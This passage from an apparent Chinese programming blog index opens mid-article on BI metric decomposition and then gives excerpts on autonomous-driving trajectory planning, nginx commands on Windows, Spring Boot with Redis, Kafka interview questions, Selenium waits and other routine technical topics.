我们就来到了第三步：我们把这个“潜在客户数”的驱动指标背后的影响要素统统找出来，这样又形成了一系列最细颗粒度的指标，我们称之为“活动类”的指标。这些指标就是我们企业执行层最关心的问题。比如，我们可以把潜在客户数这个驱动指标，分解成商机数量、有效接触、获得认可和有效登记这几个活动指标的关系，这样一层层地顺藤摸瓜，我们通过钻取分析，发现“获得认可”是所有活动指标中达标率最差的。我们通过研究这个问题，最后发现公司里有一些销售虽然商机数量不少，但是第一次接触新客户，很容易被拒绝，认可率太低，导致整体业绩的大幅度下降。所以通过这几层指标的分解，我们就很容易地找到了收入不达标这个问题的关键症结点。当然，我们接下来就可以针对性地培训这些销售，让他们尽快改善，提升业绩。这就是我们智扬BI设计方法论里经常说的“偏差归因”，在我们内部术语里，又称之为找“坏人”（根本原因）。
那为什么BI能让企业快速找到“坏人”呢？究其原因，是我们用BI设计出多层次的管理驾驶舱和明细报表，通过实际的应用场景建立起这些指标之间的关联，形成了一个指标树。这个指标树，代表了我们企业经营活动背后的本质关系和底层逻辑。只有通过指标关联和应用场景的设计，再通过数据仓库模型的实施，以及BI工具实时的钻取分析等功能，才能在第一时间找到问题的核心原因，我们的管理才能做到真正的及时和有效。找到“坏人”之后，下一步还可以再利用BI的工具对这些坏人（即需要改善的活动类的KPI）进行实时监控，及时关注改善过程，直到问题彻底根治，这就是我们智扬BI方法论经常提到的另外一个点：过程纠偏。
如果整个改善是有效的，企业就可以通过标准化流程把方法固化下来，避免问题的再出现。这就是数字化协助企业管理改善的一个完整的闭环过程。当然，这只是一个最简单的例子，根据不同行业、不同业务模块的特点，不同的需求和落地的算法，还有很多的细节，我们会在后续文章中再分享。
从这个例子中，我们又可以这么给BI一个定义：BI，就是抓问题，找原因；监控过程，看改善的数字化工具。正确的使用好BI，企业就像一艘安装了高科技数字管理控制台的巨轮，每一个方向都会在你这个舵手的实时掌控之中。现在我们回过头，再看看文章开头对BI的两大误解，你就会明白，这两个误解其实代表了两种经典的错误的BI应用方式。只用BI做一个花瓶式的管理驾驶舱，没有任何意义，对于一个最终结果指标（大数）的好坏，管理层心里比谁都清楚，根本不需要你再画一个漂亮的大屏告诉他，他病的有多重。他关心的是企业的病因是什么？到底怎么治疗这个病？这才是管理者最想知道的。如果只用BI做一个单纯的明细报表工具呢？对做报表的员工有节约工作量的意义，但是对管理者，意义也很小。你想，一大堆密密麻麻的数字海洋，一个管理者每天用放大镜从海量数据里自己去抓重点、找答案，想一想这个场景，你是不是也觉得他特别值得同情。所以，错误的认知只能导致错误的方法，这两大超级误解就是中国很多企业买了很多种BI工具产品，但应用到最后，却成效甚微的根本原因。
所以一个优秀的BI设计，要像我今天说的这个简单案例一样，逐层分解企业目标，设计好指标体系、应用场景，并以此为依据，定义出多层级管理驾驶舱和明细报表，将钻取、多维分析、监控报警、假设分析等功能和实际的企业管理目标（问题）有机结合，才能真正地将数据赋能于企业管理，发挥出BI应有的效益。如果这样去设计BI，实施BI，BI就能成为企业数字化转型最核心的信息系统，企业管理最重要的数字化工具，企业的“智慧大脑”。管理就能做到“看的到”、“看的清”、“看的远”，就能在变化的市场始终拥有竞争力！这就好比我们下棋，斗地主，打麻将，你依靠的必须是计算，而决不能是手气一样。企业管理更是如此，依靠的必须是数学而不能是语文，必须是科学而不能是感觉。
古人云：运筹于帷幄之中，决胜于千里之外。这是每一个企业管理者的美好愿望，也是BI、大数据这类系统应该赋予管理的真正价值。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b00f6d05b49190ab77cbff2ad00860d3/" rel="bookmark">
			Apollo项目::轨迹规划综述::导航规划、行为规划、动作规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		轨迹规划分为不同层次：导航规划、行为规划、动作规划。这里一一展开简单来说。
1.导航规划
A*算法一直是一个经典高效的离散空间路径搜索算法，这里导航规划我们就直接等同于A*算法来讲解。
2.行为规划
依据全局导航路线信息，根据当前交通场景和环境感知的信息，加上自身当前驾驶状态，在交通规则的约束和驾驶经验的指导下规划出合理的驾驶行为。
这是决策层最核心的部分，做出正确的行为规划，是无人驾驶的最高目标！俗称“聪明的大脑”！目前在没有一个“最佳解决方案”，普遍认可和采用的方法是分层有限状态机，最近也有用基于马尔可夫决策的模型。
行为决策层需要解决的问题如下：
a. 所有的路由寻径结果：比如无人车为了达到目的地，需要进入的车道是什么（Target Lane）。
b. 无人车的当前自身状态：车的位置速度朝向，以及当前主车所在的车道。
c. 无人车的历史信息：在上一个行为决策周期，无人车所做出的决策是什么？是跟车，停车，转弯或者是换道？
d. 无人车周边的障碍物信息：无人车周边一定距离范围内的所有障碍物信息。例如周边的车辆所在的车道，邻近的路口有哪些车辆，它们的速度位置如何？以及在一个较短的时间内它们的意图和预测的轨迹。周边是否有自行车或者行人，以及他们的位置速度轨迹等。
e. 无人车周边的交通标识信息：一定范围内的Lane的变化情况。比如路由寻径的结果是在Lane1的纵向位移10m处换道进入对应的相邻Lane2的纵向位移20m处，那么Lane1的合法的纵向位移换道空间是多大？比如从一个直行Lane行驶结束，需要进入下一个左转Lane，两条Lane的交界处是否有红绿灯或者人行道？
f. 当地的交通规则：例如道路限速，是否可以红灯右拐等等。
3. 轨迹规划是自动驾驶技术中最重要的部分，之前的文章有一些这方面的介绍，但是并不全面和系统：
初探轨迹规划：主要从 带约束的多项式拟合；贝赛尔曲线；三次样条差值；等角度介绍轨迹规划。
动态避障规划：主要从 周围车辆预测；轨迹初始化；避障优化轨迹 等角度介绍轨迹规划。
然而这些文章不够全面和系统，不免产生盲人摸象的感觉，这里结合百度Apollo和pony.ai较为系统和全面的介绍次轨迹规划。
轨迹规划本质上来说是一个优化问题。谈到优化问题，我们需要知道优化的约束和优化的目标。
首先看约束，
第一个约束就是车辆要遵守交规，这是强制性的约束；
第二个约束是要避免碰撞；
第三个约束是要使规划的轨迹在控制上可实现，不能出现规划了一个急弯的轨迹，车根本拐不过来的状况。
而优化的目标总的来说就是要跟人开的像，具体表现就是让人乘坐起来感到舒适。但像人也有不同的优化目标，比如我们可以开的稳一点也可以开的急一点，像老司机一点。
3. 规划
正是因为轨迹规划是非凸的，所以我们需要用决策的模块来解决。什么是决策呢？从数学上来讲，决策就是限定非凸问题的解空间，将问题转化为凸的。我们可以看下图的例子，如果两个人在穿马路的话，我们大体上可以有四种不同的决策，既让两个人，超两个人，让一超一和超一让一。而一旦决策确定，那么其实就可转换为凸的问题，求解就会相对来说比较容易。决策也会使解更加稳定，因为一个单纯的数值优化问题的求解，会很难保证每一帧的解是相对稳定的，不会出现第一帧要让，而第二帧却要冲的问题。但需要注意决策的问题是一个NP-hard 问题。有一些需要决策的场景，比如抢行还是让行，是否要冲黄灯，在哪两辆车之间变道、并线，是否要主动变道，是从左还是右绕行前方障碍物，只有做了决策才能使问题变为凸优化问题，便于求解。
对于凸问题，有很多比较快速的算法进行计算了。线性规划，二次规划，序列二次规划，都是数值求解优化问题的方式。我们可以看一下二次规划中，如果Q正定，二次规划就是凸的问题，有很快的方式求解它。
下边就是看如何把自动驾驶中的问题转化为优化问题。
动态避障规划 动态避障规划是接上回，导航规划和行为规划之后，动态避障规划是以上方面的具体实现，直接输出的是车辆行驶轨迹，如何合理的输出轨迹是自动驾驶的关键。
本文分为以下三个方面来实现：周围车辆预测，轨迹初始化，避障优化轨迹。
(5条消息) 轨迹规划综述_旅途者0107的博客-CSDN博客_轨迹规划
(49条消息) 自动驾驶（十五）---------再论轨迹规划_一实相印的博客-CSDN博客_分层有限状态机
(49条消息) 自动驾驶（十六）---------动态避障规划_一实相印的博客-CSDN博客_动态避障
(49条消息) 自动驾驶（五十四）---------三顾轨迹规划_一实相印的博客-CSDN博客
(49条消息) 自动驾驶（五十五）---------四解轨迹规划_一实相印的博客-CSDN博客_四阶轨迹规划
(49条消息) 自动驾驶（八十三）---------Apollo之规划模块_一实相印的博客-CSDN博客_apollo 路径规划模块类图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2069bd4dfffe586f76a473adf1c54217/" rel="bookmark">
			windows启动nginx常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 windows启动nginx
可以直接双击nginx.exe启动或者将下边的脚本保存为bat文件双击运行.
d:\dashidan.com\nginx-1.0.2&gt;start nginx
或
d:\dashidan.com\nginx-1.0.2&gt;nginx.exe
建议使用第一种,第二种会使你的cmd窗口一直处于执行中,不能进行其他命令操作.
注:d:\dashidan.com换成自己的nginx安装路径
2 windows停止nginx
可以直接在资源管理器中找到nginx.exe进程点右键,选择结束进程, 或者将下边的脚本保存为nginx_stop.bat文件双击运行.需要将nginx.exe的路径改为nginx的安装目录.
d:\dashidan.com\nginx-1.0.2&gt;nginx.exe -s stop
或
d:\dashidan.com\nginx-1.0.2&gt;nginx.exe -s quit
stop是快速停止nginx,可能并不保存相关信息.
quit是完整有序的停止nginx,并保存相关信息.
3 重新载入Nginx配置
nginx配置有修改,但你不想重启nginx的时候,可以使用reload命令重新加载配置文件.
d:\dashidan.com\nginx-1.0.2&gt;nginx.exe -s reload
4 重新打开日志文件
通过nginx.exe -s reopen命令可以重新打开日志文件.
d:\dashidan.com\nginx-1.0.2&gt;nginx.exe -s reopen
5 查看Nginx版本
nginx -v查看Nginx版本号.
d:\dashidan.com\nginx-1.0.2&gt;nginx -v
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f74572c323bc1b7cfd2ce46323ea7e06/" rel="bookmark">
			青少年成长管理 第04章 成长资源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		“你想长成参天大树，就需要阳光、空气、水和肥料” 人的成长同样需要一定的条件和资源。
04.01 成长条件 04.01.01 主体条件 是指成长主体自身的条件。如身体健康程度、智力水平、性格特征等。现代科学认为遗传因素影响最大。
04.01.02 环境条件 家庭条件。
家庭经济条件。成长需要投入，有各种各样的支出。
家庭文化条件。有什么、信什么、会什么、干什么。人脉。权势。以上这些，都将对成长产生一定的制约和影响。
家长教育能力。根据家长的知识水平，对成长主体的影响是非常直接的。日常言行的知识传递。了解学科发展动向。了解教育资源分布。学校老师有效勾通。承担部分教育任务。制定成长计划并组织实施。这些都需要家长具有一定的知识水平和教育能力。
家长专业技术能力。可以子承父业吗？
家长精力投入。
家庭条件的现状是，有时间的没能力，有能力的没时间。制定计划、学习任务考核验收、计划完成情况审核、计划调整、专业方向的选择。引入更加详细的社会化分工势在必行。在制定成长目标及成长计划时，首先要认真评估成长条件。
时代背景。就业时间：2035年以后。计划开始时间：2020年。成长主体年龄：10岁。
地域环境。成长地点：中国，某城市或乡村。主要是教学条件。
社会环境。互联网、大数据、开放源代码、共享经济、机器人、人工智能。预计到2050年，全球就业率将降低10%以内。
文化环境。是指所在环境的宗教信仰、风俗习惯、文化生活等，也会对一个人的成长构成影响。对策：孟母三迁。近年在很多地区都出现大量的农村或小城镇的父母为孩子教育移居到更大的城市或租住陪读。充分了解外部环境及未来发展的趋势，制定面向未来的成长策略。
学习条件。公办学校。民办学校。外国学校。民营教育机构。互联网在线教育。自学。
发展趋势。应当注意到成长环境的变动趋势。
04.01.03 成长条件评估 正确地进行成长条件的评估，有利于正确地进行成长决策。正确认识成长主体的主观条件为成长主体创造更合适的成长环境，根据成长条件进行成长成本决策，清醒地认识成长条件与他人的区别，根据未来发展趋势制定合理的成长目标。
本节摘要：青少年成长管理第04章 成长资源 01 成长条件
成长条件直接影响成长工程的顺利实施，就像一般的工程都需要充足的资金投入一样。成长工程除了需要资金投入以外，还需要很多其他条件，认真评估成长条件，扫清成长工程施工的障碍。
作业：
成长条件评估。
成长条件不足时的对策。
04.02 成长资源 有的年轻人经常说，“我要靠自己，不靠家长”，这是非常错误的。
成长资源。成长过程中需要用到的物质或实体（人或组织）。人和物。成长资源管理是成长导师的任务之一。
04.02.01 媒体资源 各种知识的载体，都可以是重要的成长资源。
图书。最基本的学习资源。最便宜的知识来源。绝大部分知识都可以从书中获得。注意：读书不等于学习、学习不等于成长。
语音。mp3。哔哩哔哩。新闻、相声、评书、有声读物等等。（光盘，录音带）。
视频。影视、课程、录播、直播。（广播电视）。
软件、网站（app）。
专业工具或网站、平台（网校、教育平台）。
04.02.02 教育资源 学校、教育机构等属于教育资源。各类学校、培训机构、其他服务机构。
04.02.03 人脉资源 老师、朋友、领导、亲戚。人脉是不可或缺的成长资源（关键资源）。是进入圈子的关键。
04.02.04 设备资源 实验设备、电子设备、智能设备。对于某些专业方向来说是关键资源。
04.02.05 资源策略 充分利用现有资源。
深入挖掘潜在资源。
必须获得关键资源。
精确计算资源成本。
04.02.06 资源推荐 国家中小学智慧教育平台：https://www.zxx.edu.cn/
国家终身教育平台：https://le.ouchn.cn/home/
CSDN程序员技术社区：https://www.csdn.net/
哔哩哔哩：https://www.bilibili.com/
学堂在线：https://www.xuetangx.com/
全国图书馆参考咨询联盟：http://www.ucdrs.superlib.net/
百度百科。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f74572c323bc1b7cfd2ce46323ea7e06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddf2d203a7a69f9f6739f5e52ab95a98/" rel="bookmark">
			手把手教你写MC9S12G128 Timer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、TIM模块概述
1.定时器/计数器的特点
2.嵌入式系统中定时器/计数器模块的作用
二、TIM模块结构和工作原理
1.TIM结构模块
1.1 TIM组成
1.2 特点
2.TIM模块工作原理
2.1 工作模式
2.2 定时器模块框图
2.3 详细功能框图
3.TIM模块寄存器
【控制寄存器】
【数据寄存器】
【状态寄存器】
4.TIM模块中断系统
三、TIM模块的自由运行计数器和定时器基本寄存器设置
1.自由运行主定时器与时钟频率设置
2.TIM模块基本寄存器及设置
2.1 TIM模块的基本寄存器
一、TIM模块概述 1.定时器/计数器的特点 可以有多种工作方式——定时方法或技术方式计数器的模值可变——技术的最大值有一定的限制，取决于计数器的位数。计数的最大值限制了定时的最大值可以根据的规定的定时或计数值，当到达定时时间或到达计数终点时，发出中断请求信号，以便实现定时或计数控制 定时器——计数脉冲来自于系统工作时钟或经过分频后的系统时钟，即驱动脉冲内为部时钟信号
计数器——计数脉冲来自于芯片外部引脚，即驱动脉冲为外部时钟信号 2.嵌入式系统中定时器/计数器模块的作用 产生波形输出 从MCU的I/O引脚向外输出一系列符合一定时序规范的周期信号。
测量输入波形 从MCU的I/O引脚上检测外部输入的一系列周期信号的脉宽、周期或频率。
统计脉冲或边沿个数 对端口引脚输入的、由外部事件产生的触发信号进行计数。
作为定时基准 产生内部定时，例如用于定时采样等
MC9S12系列定时器模块称为TIM（Timer Module) 二、TIM模块结构和工作原理 1.TIM结构模块 1.1 TIM组成 1个16位自由运行计数器8个16位输入捕捉/输出比较通道1个16位脉冲累加器 1.2 特点 模块时钟输入具有7位预分频器8个输入捕捉通道带有边沿检测器8个输出比较通道的输出极性可选择16位脉冲累加器带有边沿检测器 2.TIM模块工作原理 2.1 工作模式 停止模式（STOP）冻结模式（Freeze)等待模式（Wait)正常模式（Normal) 2.2 定时器模块框图 2.3 详细功能框图 自由运行计数器
TIM的核心——16位自由运行计数器，也称为自由运行主定时器。系统复位时——自由运行计数器为$0000。模块运行时——自由运行计数器从$0000～$FFFF循环递增计数。溢出复零时——置位中断标志。时钟源TIMCLK—— PCLK，PACLK，PACLK/256，PACLK/65536。预分频器时钟PCLK——由总线时钟经过一个7位预分频器得到。预分频系数—— 8种 输入捕捉
输入捕捉(Input Capture，IC)：通过捕获自由运行计数器的计数值来检测外部事件和记录选定的输入信号跳变边沿的时间。
当外部事件发生或信号发生变化时，指定的输入捕捉通道对应的引脚上产生一个规定的跳变沿（上升沿或下降沿）。定时器输入通道根据相应引脚上的电平变化，将当前自由运行计数器中的计数值捕捉到通道寄存器中。
如果此时允许输入捕捉中断，则产生一次输入捕捉中断申请，利用中断服务程序可读取通道计数器数值，获得事件发生的时刻或信号变化的时刻
输入比较
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddf2d203a7a69f9f6739f5e52ab95a98/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8351fe2032537da8b03af10af250337/" rel="bookmark">
			7.Springboot集成Redis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		感谢秦疆老师的redis视频教程，更多了解哔哩哔哩搜索【狂神说Java】。
本文内容源于秦疆老师的redis视频教程。给狂神推荐，点赞吧！
SpringBoot整合 SpringBoot操作数据：spring-data jpa mongodb redids!
SpringData也是和SpringBoot齐名的项目！
说明：在SpringBoot2.x之后，原来使用的jedis被替换成了lettuce
jedis:采用的直连，多个线程操作的话，是不安全的，如果想要避免不安全的，使用jedis pool连接池！更像BIO模式lettuce:采用netty,实例可以在多个线程中进行共享，不存在线程不安全的情况！可以减少线程数据了,更像NIO模式 源码分析： @Configuration(proxyBeanMethods = false) @ConditionalOnClass(RedisOperations.class) @EnableConfigurationProperties(RedisProperties.class) @Import({ LettuceConnectionConfiguration.class, JedisConnectionConfiguration.class }) public class RedisAutoConfiguration { @Bean //我们可以自己定义一个redisTemplate来替换这个默认的！ @ConditionalOnMissingBean(name = "redisTemplate") public RedisTemplate&lt;Object, Object&gt; redisTemplate(RedisConnectionFactory redisConnectionFactory) throws UnknownHostException { //默认的RedisTemplate没有过多的的设置，redis对象都是需要序列化的 //两个泛型都是Object,Object的类型，我们后使用需要强制换为&lt;String,Object&gt; RedisTemplate&lt;Object, Object&gt; template = new RedisTemplate&lt;&gt;(); template.setConnectionFactory(redisConnectionFactory); return template; } @Bean //由于String是redis最常用的类型，所以单独提出来了一个bean @ConditionalOnMissingBean public StringRedisTemplate stringRedisTemplate(RedisConnectionFactory redisConnectionFactory) throws UnknownHostException { StringRedisTemplate template = new StringRedisTemplate(); template.setConnectionFactory(redisConnectionFactory); return template; } } 测试 整合测试一下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8351fe2032537da8b03af10af250337/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b14e277460db16834c1f328a2b70e8e/" rel="bookmark">
			Android 版本号及对应的版本名称
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文只是简单罗列最新Android版本号及对应的版本名称,后续更新中…
API版本号版本名称API 33android 13 TiramisuAPI 31android 12 Snow ConeAPI 30android 11 Red Velvet CakeAPI Qandroid Q Quince TartAPI 28android 9.0 PieAPI 27android 8.1 OreoAPI 26android 8.0 OreoAPI 25android 7.1 NougatAPI 24android 7.0 NougatAPI 23android 6.0 MarshmallowAPI 22android 5.1 LollipopAPI 21android 5.0 LollipopAPI 20android 4.4W KitKatAPI 19android 4.4 KitKatAPI 18android 4.3 Jelly BeanAPI 17android 4.2 Jelly BeanAPI 16android 4.1 Jelly BeanAPI 15android 4.0.3 ~4.0.4 Ice Cream SandwichAPI 14android 4.0 ~ 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b14e277460db16834c1f328a2b70e8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/702314d988ec8c050bf06aaabc1e6e07/" rel="bookmark">
			Visual Studio 文本编辑器水平滚动条快捷键
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Visual Studio 文本编辑器水平滚动条快捷键 一时上头，观摩前辈代码时老是要手动拖动水平滚动条。百度半天，自己瞎折腾，想设置快捷键里设置个跟WPS类似的水平滚动条拖动的快捷键（WPS里Alt+鼠标滚轮），皇天不负，在官网找到了。
“Shift+鼠标滚轮”
第一次写这种。有帮助到的兄弟点个赞让我开心下吧，谢谢！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5433dfe2f656af5756345bce584eadc0/" rel="bookmark">
			2023年java面试题之kafka（5道）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. kafka介绍：
1.消息分类按不同类别,分成不同的Topic,Topic⼜拆分成多个partition,每个partition均衡分散到不同的服务器(提⾼并发访问的能⼒)
2.消费者按顺序从partition中读取,不⽀持随机读取数据,但可通过改变保存到zookeeper中的offset位置实现从任意位置开始读取
3.服务器消息定时清除(不管有没有消费)
4.每个partition还可以设置备份到其他服务器上的个数以保证数据的可⽤性。通过Leader,Follower⽅式
5.zookeeper保存kafka服务器和客户端的所有状态信息.(确保实际的客户端和服务器轻量级)
6.在kafka中,⼀个partition中的消息只会被group中的⼀个consumer消费;每个group中consumer消息消费互相独⽴;我们可以认为⼀个group是⼀个"订阅"者,⼀个Topic中的每个partions,只会被⼀个"订阅者"中的⼀个consumer消费,不过⼀个consumer可以消费多个partitions中的消息
7.如果所有的consumer都具有相同的group,这种情况和queue模式很像;消息将会在consumers之间负载均衡.
8.如果所有的consumer都具有不同的group,那这就是"发布-订阅";消息将会⼴播给所有的消费者.
9.持久性,当收到的消息时先buffer起来,等到了⼀定的阀值再写⼊磁盘⽂件,减少磁盘IO.在⼀定程度上依赖OS的⽂件系统(对⽂件系统本身优化⼏乎不可能)
10.除了磁盘IO,还应考虑⽹络IO，批量对消息发送和接收,并对消息进⾏压缩。
11.在JMS实现中,Topic模型基于push⽅式,即broker将消息推送给consumer端.不过在kafka中,采⽤了pull⽅式,即consumer在和broker建⽴连接之后,主动去pull(或者说fetch)消息;这种模式有些优点,⾸先consumer端可以根据⾃⼰的消费能⼒适时的去fetch消息并处理,且可以控制消息消费的进度
(offset);此外,消费者可以良好的控制消息消费的数量,batch fetch.
12.kafka⽆需记录消息是否接收成功,是否要重新发送等,所以kafka的producer是⾮常轻量级的,consumer端也只需要将fetch后的offset位置注册到zookeeper,所以也是⾮常轻量级的.
--kafka使⽤场景,对于⼀些常规的消息系统,kafka是个不错的选择;partitons/replication和容错,可以使kafka具有良好的扩展性和性能优势.不过到⽬前为⽌,我们应该很清楚认识到,kafka并没有提供JMS中的"事务性""消息传输担保(消息确认机制)""消息分组"等企业级特性;
kafka只能使⽤作为"常规"的消息系统,在⼀定程度上,尚未确保消息的发送与接收绝对可靠(⽐如,消息重发,消息发送丢失等).
kafka的特性决定它⾮常适合作为"⽇志收集中⼼";application可以将操作⽇志"批量""异步"的发送到kafka集群中,⽽不是保存在本地或者DB中;kafka可以批量提交消息/压缩消息等,这对
producer端⽽⾔,⼏乎感觉不到性能的开⽀.consumer端采⽤批量fetch⽅式,此时consumer端也可以使hadoop等其他系统化的存储和分析系统
二. kafka和RabbitMQ区别：
1、RabbitMQ,遵循AMQP协议，由内在⾼并发的erlanng语⾔开发，⽤在实时的对可靠性要求⽐较⾼的消息传递上(有消息确认机制)。
2、kafka是Linkedin于2010年12⽉份开源的消息发布订阅系统,它主要⽤于处理活跃的流式数据,⼤数据量的数据处理上(⽆消息确认机制，但吞吐量⾼)，kafka⽤zk做集群负载均衡。
三. 项⽬中哪⾥⽤到了kafka，它有什么特性？
a. 场景：
i. ⼤数据部⻔流数据处理；
ii. elk；
b. 特性：
i. 它被设计为⼀个分布式系统，易于向外扩展；
ii. 它同时为发布和订阅提供⾼吞吐量；
iii. 它⽀持多订阅者，当失败时能⾃动平衡消费者；
iv. 它将消息持久化到磁盘，因此可⽤于批量消费，例如ETL，以及
实时应⽤程序。
四. kafka数据分区和消费者的关系，kafka的数据offset读取流程，kafka内部如何保证顺序，结合外部组件如何保证消费者的顺序？
1、kafka数据分区和消费者的关系：1个partition只能被同组的⼀个consumer消费，同组的consumer则起到均衡效果
2、kafka的数据offset读取流程
​ 1).连接ZK集群，从ZK中拿到对应topic的partition信息和partition的Leader的相关信息
​ 2).连接到对应Leader对应的broker
​ 3).consumer将⾃⼰保存的offset发送给Leader
​ 4).Leader根据offset等信息定位到segment（索引⽂件和⽇志⽂
件）
​ 5).根据索引⽂件中的内容，定位到⽇志⽂件中该偏移量对应的开始
位置读取相应⻓度的数据并返回给consumer
3、kafka内部如何保证顺序：
kafka只能保证partition内是有序的，但是partition间的有序是没办
法的。爱奇艺的搜索架构，是从业务上把需要有序的打到同⼀个
partition。
5. kafka⼯作流程？
Apache Kafka是分布式发布-订阅消息系统。它最初由LinkedIn公司开发，之后成为Apache项⽬的⼀部分。Kafka是⼀种快速、可扩展的、设计内在就是分布式的，分区的和可复制的提交⽇志服务。
a. ⽣产者定期向主题发送消息。 b.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5433dfe2f656af5756345bce584eadc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20b3b3de9ad962c746018578377ee1e5/" rel="bookmark">
			el-table树形列表拖拽排序(sortablejs)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		思路：
首先el-table上面row-class-name绑定要传的id，
然后将树形结构的数据转换成平铺的列表结构，
拖拽结束后的监听事件onEnd内可以获取到
通过拖拽可以获取到 旧数据 与 新数据对象以及拖拽后平铺的数据顺序，
这时可以通过拖拽后平铺的数据顺序配合parentId来知道当前层级的顺序和id
将这排好顺序的id数组传给后端，后端返回最新的数据
拖拽中事件监听onMove内可以阻止树形结构内的子集拖拽出去。
1.引入sortablejs
npm install sortablejs --save 2.组件中使用
import Sortable from 'sortablejs'; &lt;el-table :data="menuList" row-key="menuId" :row-class-name="tableClassNmae" :expand-row-keys="expandRowKeys" v-if="showFlag"&gt;&lt;/el-table&gt; tableClassNmae(row){ return 'id=' + row.row.id + '' } // 将树数据转化为平铺数据 function treeToTile(treeData, childKey = 'children') { const arr = [] const expanded = data =&gt; { if (data &amp;&amp; data.length &gt; 0) { data.filter(d =&gt; d).forEach(e =&gt; { arr.push(e) expanded(e[childKey] || []) }) } } expanded(treeData) return arr } let activeRows = reactive([]); let flag = true; let expandRowKeys=ref([]) //展开行的id,底下用的是拖拽行的parentId，其实就是应该展开的行 let showFlag=ref([true]) let menuList=ref([]) //表格数据 onmounted(()=&gt;{ //获取需要添加拖拽的组件 const el = document.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20b3b3de9ad962c746018578377ee1e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d659deb9f04a894d6dfeb9557a011f00/" rel="bookmark">
			软件测试 | 隐式等待、显示等待和强制等待分别是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		等待机制简介
系统在实际工作中引入等待机制可以保证代码运行的稳定性，保证代码运行不会受网速、计算机心梗等条件的约束。
等待就是当系统运行是，如果页面的渲染速度跟不上程序的运行速度，就需要认为地区限制程序执行的速度。
测试元在做Web自动化测试时，一般要等待页面元素加载完成后，才能执行测试操作，否则会报找不到元素等错误，这样就要求在有些测试场景下加上等待机制。
最常见的等待机制有3种：隐式等待、显示等待和强制等待，下面介绍这3种等待机制。
1.隐式等待 我们在测试用例中设置一个隐式等待时间，测试用例执行时会按时间轮询查找（默认0.5秒）元素是否出现，如果在轮询查找的时间内元素没出现系统就抛出异常。
隐式等待的作用域是全局的，隐式等待可以在setup方法中设置，是作用在整个Session的声明周期。也就是说只要设置一次隐式等待，后面就不需要再设置。如果再次设置隐式等待，那么后一次的设置会覆盖前一次的设置。
实战演示
当我们在 DOM 结构中查找元素，且元素处于不能立即交互的状态时，将会触发隐式等待。
Python版本实现代码
self.drvier.implicitly_wait(30) Java版本实现代码
//隐式等待调用方式，设置等待时间为30秒 driver.manage().timeouts().implicitlyWait(30,TimeUnit.SECONDS); 2.显式等待 显式等待是在代码中定义等待条件，触发改条件后再执行后续代码，这是根据判断条件进行等待。通俗地讲就是，程序每隔一段时间进行一次条件判断，如果条件成立，则执行下一步；否则继续等待，知道超过设置的最长时间。核心用法代码如下。
Python版本
# 导入显式等待 from selenium.webdriver.support.wait import WebDriverWait from selenium.webdriver.support import expected_condittions ... # 设置10秒的最大等待时间，等待（By.TAG_NAME,"title"）这个元素被点击 WebDriverWait(driver,10).until( expected_conditions eleniumt_to_be_clickable((By.TAG_NAME,"title")) ) ... 这里通过导入expected_conditions这个库来满足显式等待所需的使用场景，但是expected_conditions库并不能满足所有场景，这个时候就需要定制化开发一个库来满足特定场景，Java版的实现如下。
Java版本
import org.openqa.selenium.support.ui.ExpectedCondition; import org.openqa.selenium.support.ui.WebDriverWait; ... //设置10秒的最大等待时间，等待（By.tag_NAME,"title"）这个元素被点击 WebDriverWait wait = new WebDriverWait(driver,10); wait.unitl(ExpectedConditions.elementToBClickable(By.tagName("title"))); ... 实战演示
假设：测试Web应用中某个元素超过指定的个数，就可以执行某一个操作。
Python演示代码
def ceshiren(): # 定义一个方法 def wait_ele_for(driver): # 将找到的元素个数赋值给eles eles = driver.find_enements(By.XPATH,'//*[@id="site-test-logo"]') #返回结果 returun len(eles)&gt;0 driver = webdriver.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d659deb9f04a894d6dfeb9557a011f00/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e73c27d502f4555868e5c5c5d5946e4/" rel="bookmark">
			for循环三种跳出循环的方法（retrun、continue、break）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
